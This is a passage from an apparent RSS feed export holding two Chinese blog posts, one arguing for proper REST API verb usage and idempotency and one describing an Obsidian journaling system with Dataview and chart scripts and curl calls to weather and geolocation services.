“<strong>控制逻辑</strong>”。</p>\n<ul>\n<li><strong>业务逻辑</strong>。就是你实现业务需求的功能的代码，就是跟用户需求强相关的代码。比如，把用户提交的数据保存起来，查询用户的数据，完成一个订单交易，为用户退款……等等，这些是业务逻辑</li>\n<li><strong>控制逻辑</strong>。就是我们用于控制程序运行的非功能性的代码。比如，用于控制程序循环的变量和条件，使用多线程或分布式的技术，使用HTTP/TCP协议，使用什么样数据库，什么样的中间件……等等，这些跟用户需求完全没关系的东西。</li>\n</ul>\n<p>网络协议也是一样的，一般来说，<strong>几乎所有的主流网络协议都有两个部分，一个是协议头，一个是协议体。协议头中是协议自己要用的数据，协议体才是用户的数据。所以，协议头主要是用于协议的控制逻辑，而协议体则是业务逻辑。</strong></p>\n<p>HTTP的动词（或是Method）是在协议头中，所以，其主要用于控制逻辑。</p>\n<p dir=\"auto\">下面是HTTP的动词规范，一般来说，REST API 需要开发人员严格遵循下面的标准规范（参看<a href=\"https://www.rfc-editor.org/rfc/rfc7231#section-4.2.2\" target=\"_blank\" rel=\"noopener\">RFC7231 章节4.2.2 – Idempotent Methods</a>）</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n<th>幂等</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GET</td>\n<td>用于查询操作，对应于数据库的 <code>select</code> 操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>用于所有的信息更新，对应于数据库的 <code>update </code>操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎︎</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>用于更新操作，对应于数据库的 <code>delete</code> 操作</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎︎</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>用于新增操作，对应于数据库的 <code>insert</code> 操作</td>\n<td>✘</td>\n</tr>\n<tr>\n<td>HEAD</td>\n<td>用于返回一个资源对象的“元数据”，或是用于探测API是否健康</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n<tr>\n<td>PATCH</td>\n<td>用于局部信息的更新，对应于数据库的 <code>update</code> 操作</td>\n<td>✘</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>获取API的相关的信息。</td>\n<td><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/2714.png\" alt=\"✔\">︎</td>\n</tr>\n</tbody>\n</table>\n<p>其中，<code>PUT</code> 和 <code>PACTH</code> 都是更新业务资源信息，如果资源对象不存在则可以新建一个，但他们两者的区别是，<code>PUT</code> 用于更新一个业务对象的所有完整信息，就像是我们通过表单提交所有的数据，而 <code>PACTH</code> 则对更为API化的数据更新操作，只需要更需要更新的字段（参看 <a href=\"http://tools.ietf.org/html/rfc5789\" rel=\"nofollow\">RFC 5789</a> ）。</p>\n<p>当然，现实世界中，可能并不一定严格地按照数据库操作的CRUD来理解API，比如，你有一个登录的API <code>/login</code> 你觉得这个API应该是 <code>GET</code> ，<code>POST</code>，<code>PUT</code> 还是 <code>PATCH</code> ?登录的时候用户需要输入用户名和密码，然后跟数据库里的对比（select操作）后反回一个登录的session token，然后这个token作为用户登录的状态令牌。如果按上面表格来说，应该是 select 操作进行 <code>GET</code> ，但是从语义上来说，登录并不是查询信息，应该是用户状态的更新或是新增操作（新增session），所以还是应该使用 <code>POST</code>，而 <code>/logout</code> 你可以使用 <code>DELETE</code> 。<strong>这里相说明一下，不要机械地通过数据库的CRUD来对应这些动词，很多时候，还是要分析一下业务语义。</strong></p>\n<p><strong>另外，我们注意到，在这个表格的最后一列中加入了“是否幂等”的，API的幂等对于控制逻辑来说是一件很重要的事。</strong>所谓幂等，就是该API执行多次和执行一次的结果是完全一样的，没有副作用。</p>\n<ul>\n<li><code>POST</code> 用于新增加数据，比如，新增一个交易订单，这肯定不能是幂等的</li>\n<li><code>DELETE</code> 用于删除数据，一个数据删除多次和删除一次的结果是一样的，所以，是幂等的</li>\n<li><code>PUT</code> 用于全部数更新，所以，是幂等的。</li>\n<li><code>PATCH</code>用于局部更新，比如，更新某个字段 cnt = cnt+1，明显不可能是幂等操作。</li>\n</ul>\n<p>幂等这个特性对于远程调用是一件非常关键的事，就是说，远程调用有很多时候会因为网络原因导致调用timeout，对于timeout的请求，我们是无法知道服务端是否已经是收到请求并执行了，此时，我们不能贸然重试请求，对于不是幂等的调用来说，这会是灾难性的。比如像转帐这样的业务逻辑，转一次和转多次结果是不一样的，如果重新的话有可能就会多转了一次。所以，这个时候，如果你的API遵从了HTTP动词的规范，那么你写起程序来就可以明白在哪些动词下可以重试，而在哪些动词下不能重试。如果你把所有的API都用POST来表达的话，就完全失控了。</p>\n<p>除了幂等这样的控制逻辑之外，你可能还会有如下的这些控制逻辑的需求：</p>\n<ul>\n<li><strong>缓存</strong>。通过CDN或是网关对API进行缓存，很显然，我们要在查询<code>GET</code> 操作上建议缓存。</li>\n<li><strong>流控</strong>。你可以通过HTTP的动词进行更粒度的流控，比如：限制API的请用频率，在读操作上和写操作上应该是不一样的。</li>\n<li><strong>路由</strong>。比如：写请求路由到写服务上，读请求路由到读服务上。</li>\n<li><strong>权限</strong>。可以获得更细粒度的权限控制和审计。</li>\n<li><strong>监控</strong>。因为不同的方法的API的性能都不一样，所以，可以区分做性能分析。</li>\n<li><strong>压测</strong>。当你需要压力测试API时，如果没有动词的区分的话，我相信你的压力测试很难搞吧。</li>\n<li>……等等</li>\n</ul>\n<p>也许，你会说，我的业务太简单了，没有必要搞这么复杂。OK，没有问题，但<strong>是我觉得你最差的情况下，也是需要做到“读写分离”的，就是说，至少要有两个动词，<code>GET</code> 表示是读操作，<code>POST</code>表示是写操作。</strong></p>\n<h4>Restful 复杂查询</h4>\n<p>一般来说，对于查询类的API，主要就是要完成四种操作：排序，过滤，搜索，分页。下面是一些相关的规范。参考于两个我觉得写的最好的Restful API的规范文档，<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a>。</p>\n<ul dir=\"auto\">\n<li>\n<p dir=\"auto\"><strong>排序</strong>。对于结果集的排序，使用 <code>sort</code> 关键字，以及 <code>{field_name}|{asc|desc},{field_name}|{asc|desc}</code> 的相关语法。比如，某API需要返回公司的列表，并按照某些字段排序，如：<code>GET /admin/companies?sort=rank|asc</code> 或是 <code>GET /admin/companies?sort=rank|asc,zip_code|desc</code></p>\n</li>\n<li>\n<p dir=\"auto\"><strong>过滤</strong>。对于结果集的过滤，使用 <code>filter</code> 关键字，以及 <code>{field_name} op{value}</code> 的语法。比如： <code>GET /companies?category=banking&amp;location=china</code> 。但是，有些时候，我们需要更为灵活的表达式，我们就需要在URL上构造我们的表达式。这里需要定义六个比较操作：<code>=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，以及三个逻辑操作：<code>and</code>，<code>or</code>，<code>not</code>。（表达式中的一些特殊字符需要做一定的转义，比如：<code>&gt;=</code> 转成 <code>ge</code>）于是，我们就会有如下的查询表达式：<code>GET /products?$filter=name eq 'Milk' and price lt 2.55</code> 查找所有的价柗小于2.55的牛奶。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>搜索</strong>。对于相关的搜索，使用 <code>search</code> 关键字，以及关键词。如：<code>GET /books/search?description=algorithm</code> 或是直接就是全文搜索 <code>GET /books/search?key=algorithm</code> 。</p>\n</li>\n<li>\n<p dir=\"auto\"><strong>分页</strong>。对于结果集进行分页处理，分页必需是一个默认行为，这样不会产生大量的返回数据。</p>\n<ul dir=\"auto\">\n<li>使用<code>page</code>和<code>per_page</code>代表页码和每页数据量，比如：<code>GET /books?page=3&amp;per_page=20</code>。</li>\n<li><strong>可选</strong>。上面提到的<code>page</code>方式为使用相对位置来获取数据，可能会存在两个问题：性能（大数据量）与数据偏差（高频更新）。此时可以使用绝对位置来获取数据：事先记录下当前已获取数据里最后一条数据的<code>ID</code>、<code>时间</code>等信息，以此获取 “<strong>该ID之前的数据</strong>” 或 “<strong>该时刻之前的数据</strong>”。示例：<code>GET /news?max_id=23454345&amp;per_page=20</code> 或 <code>GET /news?published_before=2011-01-01T00:00:00Z&amp;per_page=20</code>。</li>\n</ul>\n</li>\n</ul>\n<p>另外，对于一些更为复杂的操作，建议通过分别调用多个API的方式来完成，虽然这样会增加网络请求的次数，但是这样的可以让后端程序和数据耦合度更小，更容易成为微服务的架构。</p>\n<p>最后，如果你想在Rest中使用像GraphQL那样的查询语言，你可以考虑一下类似 <a href=\"https://www.odata.org/\" target=\"_blank\" rel=\"noopener\">OData</a> 的解决方案。OData 是 Open Data Protocol 的缩写，最初由 Microsoft 于 2007 年开发。它是一种开放协议，使您能够以简单和标准的方式创建和使用可查询和可互操作的 RESTful API。</p>\n<h4>几个主要问题的回应</h4>\n<p>下面是对几个问题的直接回应，如果大家需要我回应更多的问题，可以在后面留言，我会把问题和我的回应添加到下面。</p>\n<h5>1）为什么API 要Restful，并符合规范？</h5>\n<p><strong>Restful API算是一个HTTP的规范和标准了，你要说是最佳实践也好，总之，它是一个全世界对HTTP API的一个共识。在这个共识上，你可以无成本地享受很多的技术红利，比如：CDN，API网关，服务治理，监控……等等。这些都是可以让你大幅度降低研发成本，避免踩坑的原因。</strong></p>\n<h5>2）为什么“过早优化”不适用于API设计？</h5>\n<p>因为API是一种契约，一旦被使用上，就很难再变更了，就算你发行新的版本的API，你还要驱动各种调用方升级他们的调用方式。所以，接口设计就像数据库模式设计一下，一旦设计好了，未来再变更就比较难了。所以，还是要好好设计。正如前面我给的几个文档——<a href=\"https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md\" target=\"_blank\" rel=\"noopener\">Microsoft REST API Guidelines</a>，<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal API Design Guidelines</a> 或是 <a href=\"https://cloud.google.com/apis/design\" target=\"_blank\" rel=\"noopener\">Google API Design Guide</a> 都是让你好好设计API的不错的 Guidelines.</p>\n<h5>3）POST 更安全吗？</h5>\n<p>不会。</p>\n<p>很多同学以为 <code>GET</code> 的请求数据在URL中，而 <code>POST</code> 的则不是，所以以为 <code>POST</code> 更安全。不是这样的，整个请求的HTTP URL PATH会全部封装在HTTP的协议头中。只要是HTTPS，就是安全的。当然，有些网关如nginx会把URL打到日志中，或是会放在浏览器的历史记录中，所以有人会说 <code>GET</code> 请求不安全，但是，<code>POST</code> 也没有好到哪里去，在 <a href=\"https://en.wikipedia.org/wiki/Cross-site_request_forgery\" target=\"_blank\" rel=\"noopener\">CSRF</a> 这个最常见的安全问题上，则完全就是针对 <code>POST</code> 的。  安全是一件很复杂的事，无论你用哪方法或动词都会不能代表你会更安全。</p>\n<p>另外，</p>\n<h5>4）全用 POST 可以节省时间减少沟通吗？</h5>\n<p>不但不会，反而更糟糕。</p>\n<p>说这种话的人，我感觉是不会思考问题。</p>\n<ul>\n<li>其一，为API赋于不同的动词，这个几乎不需要时间。把CRUD写在不同的函数下也是一种很好的编程风格。另外现在几乎所有的开发框架都支持很快速的CRUD的开发，比如Spring Boot，写数据库的CRUD基本上就不需要写SQL语言相关的查询代码，非常之方便。</li>\n<li>其二，使用规范的方式，可以节约新加入团队人员的学习成本，而且可以大大减少跨团队的沟能成本。规范和标准其实就是在节约团队时间提升整体效率的，这个我们整个人类进行协作的基础。所以，这个世界上有很多的标准，你只要照着这个标准来，你的所生产的零件就可以适配到其它厂商的产品上。而不需要相互沟通。</li>\n<li>萁三，全用POST接口一把梭，不规范不标准，使用你的这个山寨API的人就得来不断的问你，反而增加了沟通。另外，也许你开发业务功能很快了，但是你在做控制逻辑的时候，你就要返工了，从长期上来讲，你的欠下了技术债，这个债反而导致了更大的成本。</li>\n</ul>\n<h5>5）早点回家的正确姿势</h5>\n<p>不要以为你回家早就没事了，如果你的代码有这样那样的问题，别人看懂，或是出误用了你的代码出了问题，那么，你早回家有什么意义呢？你一样要被打扰，甚至被叫到公司来处理问题。所以，你应该做的是为了“长期的早回家”，而不是“短期的早回家”，要像长期的早回家，通常来说是这样的：</p>\n<ul>\n<li><strong>把代码组织设计好，有更好的扩展性</strong>。这样在面对新需求的时候，你就可以做到少改代码，甚至不改代码。这样你才可能早回家。不然，每次需求一来，你得重新写，你怎么可能早回家？</li>\n<li><strong>你的代码质量是不错的，有不错的文档和注释</strong>。所以，别人不会老有问题来找你，或是你下班后，叫你来处理问题。甚至任何人都可以很容易地接手你的代码，这样你才可能真正不被打扰</li>\n</ul>\n<h5>6）工作而已，优雅不能当饭吃</h5>\n<p>回应两点：</p>\n<p>其一，遵循个规范而已，把“正常”叫“优雅”，可见标准有多低。这么低的标准也只能“为了吃饭而生存了”。</p>\n<p>其二，<strong>作为一个“职业程序员”，要学会热爱和尊重自己的职业，热爱自己职业最重要的就是不要让外行人看扁这个职业，自己都不尊重这个职业，你让别人怎么尊重？尊重自己的职业，不仅仅只是能够获得让人羡慕的报酬，而更是要让自己的这个职业的更有含金量</strong>。</p>\n<p><strong>希望大家都能尊重自己从事的这个职业，成为真正的职业化的程序员，而不是一个码农！</strong></p>\n<figure aria-describedby=\"caption-attachment-22177\"><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2022/02/quote-your-job-gives-you-authority-your-behavior-gives-you-respect-irwin-federman-73-55-75.jpeg\" alt=\"\" width=\"834\" height=\"319\"><figcaption>你的工作给你权力，而只有你的行为才会给你尊重</figcaption></figure>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/22157.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg\" alt=\"谈谈公司对员工的监控\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/22157.html\">谈谈公司对员工的监控</a></li><li><a href=\"https://coolshell.cn/articles/21589.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg\" alt=\"如何做一个有质量的技术分享\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21589.html\">如何做一个有质量的技术分享</a></li><li><a href=\"https://coolshell.cn/articles/20977.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20977.html\">程序员如何把控自己的职业</a></li><li><a href=\"https://coolshell.cn/articles/20765.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20765.html\">MegaEase的远程工作文化</a></li><li><a href=\"https://coolshell.cn/articles/20276.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/20276.html\">别让自己“墙”了自己</a></li><li><a href=\"https://coolshell.cn/articles/19612.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/07/1920px-Margaret_Hamilton_-_restoration-e1563697198766-1-150x150.jpg\" alt=\"50年前的登月程序和程序员有多硬核\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/19612.html\">50年前的登月程序和程序员有多硬核</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22173.html\">“一把梭：REST API 全用 POST”</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://diygod.me/obsidian/",
    "timestampUsec": "1657679071252069",
    "categories": [
        "分享境",
        "user/-/state/com.google/read",
        "user/-/label/笔记系统"
    ],
    "title": "基于 Obsidian 的生活记录系统",
    "author": ";DIYgod",
    "published": 1657390980,
    "updated": 1657390980,
    "alternate": [
        {
            "href": "https://diygod.me/obsidian/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>正如我在 <a href=\"https://diygod.me/2020\">2020 年终总结</a> 中提到，我一直在用 Notion 写子弹笔记，现在它有了亿点点不一样，现在我们就来重新窥探一下我目前的生活记录系统</p><p><strong>日记</strong><br><img src=\"https://diygod.me/images/obsidian-1.png\"></p><span></span><p><strong>周记</strong>和<strong>月记</strong><br><img src=\"https://diygod.me/images/obsidian-8.png\"></p><p><strong>年记</strong><br><img src=\"https://diygod.me/images/obsidian-9.png\"></p><p>原 Notion 子弹笔记<br><img src=\"https://diygod.me/images/2020-1.jpg\" width=\"50%\"></p><p>受益于 Obsidian 强大的自动化能力和极高的自由度，日/周/月/年笔记通过预设模板自动生成，互相联动，需要手动处理的部分很少</p><p>全部文件已上传至 GitHub：<a href=\"https://github.com/DIYgod/DIYgod-Obsidian-Starter\">https://github.com/DIYgod/DIYgod-Obsidian-Starter</a>，包括主题、插件、配置文件、自己定制的样式、模板文件、示例文件等，只是作为一个示例，请根据自己实际情况修改</p><p>这些东西乍一看是有一些复杂，但其实用起来很简单，自由度和可扩展性也很强，下面我来详细介绍</p><h2><a href=\"https://diygod.me/#%E7%BB%93%E6%9E%84\" title=\"结构\"></a>结构</h2><p>目录结构如日记图左侧栏所示</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span>├── OKR.md</span><br><span>└── Journal</span><br><span>    └── 2022</span><br><span>        ├── W1</span><br><span>        |   └── 2022-01-01.md</span><br><span>        |   └── 2022-W1.md</span><br><span>        ├── 2022-01.md</span><br><span>        └── 2022.md</span><br></pre></td></tr></table></figure><p>每天会自动在本周的文件夹中生成当天的日记文件 <code>YYYY-MM-DD.md</code>，每周会自动新建一个周文件夹 <code>[W]ww</code> 和周记 <code>YYYY-[W]ww.md</code>，每月会自动生成月记 <code>YYYY-MM.md</code>，每年会自动新建一个年文件夹 <code>YYYY</code> 和年记 <code>YYYY.md</code>（更正：不是自动，仍然需要命令面板手动触发）</p><p>这些文件的内容也都是模板预设好的，已经自动填充了日期、本周期 OKR 分数和图表，甚至当天的位置、天气、月相等信息，还留出了记录当天状态和动态的位置</p><p>外面有一个 OKR 文件，大概半年更新一次，里面记录这半年的人生目标，其中有一些目标是需要每天持续努力的，日记系统的很大部分就是围绕这些目标来构建的</p><p>目录结构主要通过 <a href=\"https://github.com/liamcain/obsidian-periodic-notes\">Periodic Notes</a> 实现，模板主要通过 <a href=\"https://github.com/SilentVoid13/Templater\">Templater</a> 和 <a href=\"https://github.com/blacksmithgu/obsidian-dataview\">Dataview</a> 和核心插件 Templates 实现</p><h2><a href=\"https://diygod.me/#%E6%97%A5%E8%AE%B0\" title=\"日记\"></a>日记</h2><p><img src=\"https://diygod.me/images/obsidian-1.png\"></p><h3><a href=\"https://diygod.me/#Info\" title=\"Info\"></a>Info</h3><p>Info 是自动生成的当天信息，包括指向年月周记和 OKR 的链接，位置、天气、月相等信息</p><p>位置、天气、月相信息来自 Templater 的调用系统命令功能</p><p>获取位置和天气</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>curl wttr.in/<span>\"<span>$(curl -s --header <span>\"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\"</span> https://api.ip.sb/geoip | /opt/homebrew/bin/jq -r <span>\".city\"</span> | sed 's/ /%20/')</span>\"</span>\\?format=<span>\"%l+%c%t\"</span></span><br></pre></td></tr></table></figure><p>获取月相</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>curl wttr.in/<span>\"<span>$(curl -s --header <span>\"user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\"</span> https://api.ip.sb/geoip | /opt/homebrew/bin/jq -r <span>\".city\"</span> | sed 's/ /%20/')</span>\"</span>\\?format=<span>\"%m\"</span></span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#OKR-Tracker\" title=\"OKR Tracker\"></a>OKR Tracker</h3><p>OKR Tracke 跟踪记录当天当前阶段的 OKR 完成状况，比如 <code>Sleep:: 10.3</code> 代表今天睡了 10.3 小时，<code>Healthy Eating:: 5</code> 代表今天吃得很健康，<code>::</code> 是 Dataview 语法，会给当前页面增加</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span>page = {</span><br><span>    ...</span><br><span>    <span>\"Sleep\"</span>: <span>10.3</span>,</span><br><span>    <span>\"Healthy Eating\"</span>: <span>5</span>,</span><br><span>}</span><br></pre></td></tr></table></figure><p>这样的属性，方便接下来在周月年记中做分析和处理</p><p>其中 O1 KR2 下有一个特殊的列表，通过 API 展示了当天 Toggl Track 数据， Toggl Track 是一个时间记录应用，记录我每天在各项事务中花费的时间，比如看番时间、刷B站时间、工作时间等，这些数据同样可以反映我今天的生产力是否符合预期</p><h3><a href=\"https://diygod.me/#Notes\" title=\"Notes\"></a>Notes</h3><p>这里是真正写日记的地方，多数是一些流水账，来弥补我天生糟糕的记忆力，偶尔也会写一些想法</p><h2><a href=\"https://diygod.me/#%E5%91%A8%E8%AE%B0%E5%92%8C%E6%9C%88%E8%AE%B0\" title=\"周记和月记\"></a>周记和月记</h2><p><img src=\"https://diygod.me/images/obsidian-8.png\"></p><h3><a href=\"https://diygod.me/#Jornal-List\" title=\"Jornal List\"></a>Jornal List</h3><p>Jornal List 是自动生成的本周/月全部日记的列表，通过 Dataview 实现</p><p>获取全部日记</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>// Week</span></span><br><span><span>window</span>.<span>pages</span> = dv.<span>pages</span>(<span>`\"<span>${dv.current().file.folder}</span>\"`</span>).<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>.<span>match</span>(<span>new</span> <span>RegExp</span>(<span>`<span>${dv.current().file.name.split(<span>'-'</span>)[<span>0</span>]}</span>-\\\\d{2}-\\\\d{2}`</span>))).<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br><span></span><br><span><span>// Month</span></span><br><span><span>window</span>.<span>pages</span> = dv.<span>pages</span>().<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>.<span>match</span>(<span>new</span> <span>RegExp</span>(<span>`<span>${dv.current().file.name}</span>-\\\\d{2}`</span>))).<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br></pre></td></tr></table></figure><p>渲染列表</p><figure><table><tr><td><pre><span>1</span><br></pre></td><td><pre><span>dv.<span>paragraph</span>(<span>window</span>.<span>pages</span>.<span>file</span>.<span>link</span>.<span>join</span>(<span>', '</span>))</span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#Summary\" title=\"Summary\"></a>Summary</h3><p>这里是月末做总结和反思的地方，对应日记里的 Notes</p><h3><a href=\"https://diygod.me/#OKR-Tracker-1\" title=\"OKR Tracker\"></a>OKR Tracker</h3><p>在这里处理和分析全部日记里的 OKR 数据，最后生成分数，对应日记里的 OKR Tracker</p><p>它通过 Dataview 实现，以睡眠为例，≥ 6.5 小时且 ≤ 8.5 小时计为有效睡眠，有效睡眠天数占总天数的百分比即为得分</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></pre></td><td><pre><span><span>let</span> count = <span>0</span>;</span><br><span><span>let</span> total = <span>0</span>;</span><br><span><span>for</span> (<span>let</span> page <span>of</span> <span>window</span>.<span>pages</span>) {</span><br><span>    <span>if</span> (page[<span>'Sleep'</span>]) {</span><br><span>        count++;</span><br><span>        <span>if</span> (page[<span>'Sleep'</span>] &gt;= <span>6.5</span> &amp;&amp; page[<span>'Sleep'</span>] &lt;= <span>8.5</span>) {</span><br><span>            total++;</span><br><span>        }</span><br><span>    }</span><br><span>}</span><br><span><span>const</span> score = (total / count * <span>100</span>).<span>toFixed</span>(<span>2</span>);</span><br><span>dv.<span>el</span>(<span>'div'</span>, score + <span>'%'</span>, {</span><br><span>    <span>cls</span>: score &gt; <span>80</span> ? <span>'score-class1'</span> : score &gt; <span>50</span> ? <span>'score-class2'</span> : <span>'score-class3'</span></span><br><span>});</span><br></pre></td></tr></table></figure><p>再自己加一点 CSS，&gt; 80 分显示为绿色，50-80 分显示为黄色，&lt; 50 分显示为红色，这样就可以很清楚看出本周/月的睡觉情况，图里是黄色区间，不太好但还可以接受，下个月需要多留意</p><h3><a href=\"https://diygod.me/#Statistics\" title=\"Statistics\"></a>Statistics</h3><p>在这里把睡眠和运动数据生成统计图，可以清楚看出睡眠时长还是挺不稳定的，运动天数和时长都很少</p><p>统计图通过 <a href=\"https://github.com/phibr0/obsidian-charts\">Obsidian Charts</a> 绘制，睡眠统计图代码如下</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre></td><td><pre><span><span>const</span> times = [];</span><br><span><span>for</span> (<span>let</span> page <span>of</span> <span>window</span>.<span>pages</span>) {</span><br><span>    times.<span>push</span>(page[<span>'Sleep'</span>]);</span><br><span>}</span><br><span></span><br><span><span>const</span> chartData = {</span><br><span>    <span>type</span>: <span>'line'</span>,</span><br><span>    <span>data</span>: {</span><br><span>        <span>labels</span>: <span>window</span>.<span>pages</span>.<span>file</span>.<span>name</span>.<span>array</span>(),</span><br><span>        <span>datasets</span>: [{</span><br><span>            <span>label</span>: <span>'Sleep Time'</span>,</span><br><span>            <span>data</span>: times,</span><br><span>            <span>pointBackgroundColor</span>: <span>'#6c40d6'</span>,</span><br><span>            <span>borderColor</span>: <span>'#6c40d65c'</span>,</span><br><span>            <span>tension</span>: <span>0.4</span>,</span><br><span>            <span>spanGaps</span>: <span>true</span>,</span><br><span>        }],</span><br><span>    },</span><br><span>    <span>options</span>: {</span><br><span>        <span>scales</span>: {</span><br><span>            <span>y</span>: {</span><br><span>                <span>type</span>: <span>'linear'</span>,</span><br><span>                <span>min</span>: <span>2</span>,</span><br><span>                <span>max</span>: <span>13</span></span><br><span>            }</span><br><span>        }</span><br><span>    }</span><br><span>}</span><br><span></span><br><span><span>window</span>.<span>renderChart</span>(chartData, <span>this</span>.<span>container</span>);</span><br></pre></td></tr></table></figure><h3><a href=\"https://diygod.me/#Finance\" title=\"Finance\"></a>Finance</h3><p>本月的财务数据饼状图，通过 MoneyWiz 生成</p><h2><a href=\"https://diygod.me/#%E5%B9%B4%E8%AE%B0\" title=\"年记\"></a>年记</h2><p><img src=\"https://diygod.me/images/obsidian-9.png\"></p><p>年记与周记月记相似度也很高，但通过扩大时间尺度，可以得出很多新的有用结论</p><p>比如同样的睡眠和运动统计图，在年的尺度里就可以看出我是在 5 月底睡眠开始失控，在这期间运动也中断了，又从 6 月中旬得到缓解</p><p>还有新的体重体脂统计图，可以看出我的体重和体脂都在稳步下降，健康状况有明显改善</p><p>年记还出现了新的一种热图，记录达到目标的日子，通过 <a href=\"https://github.com/Richardsl/heatmap-calendar-obsidian\">Heatmap Calendar</a> 绘制，以睡眠为例</p><figure><table><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span><span>const</span> calendarData = { </span><br><span>    <span>entries</span>: [],</span><br><span>}</span><br><span></span><br><span><span>const</span> pages = <span>window</span>.<span>pages</span></span><br><span>    .<span>where</span>(<span><span>p</span> =&gt;</span> p.<span>Sleep</span> &amp;&amp; p.<span>Sleep</span> &gt;= <span>6.5</span> &amp;&amp; p.<span>Sleep</span> &lt;= 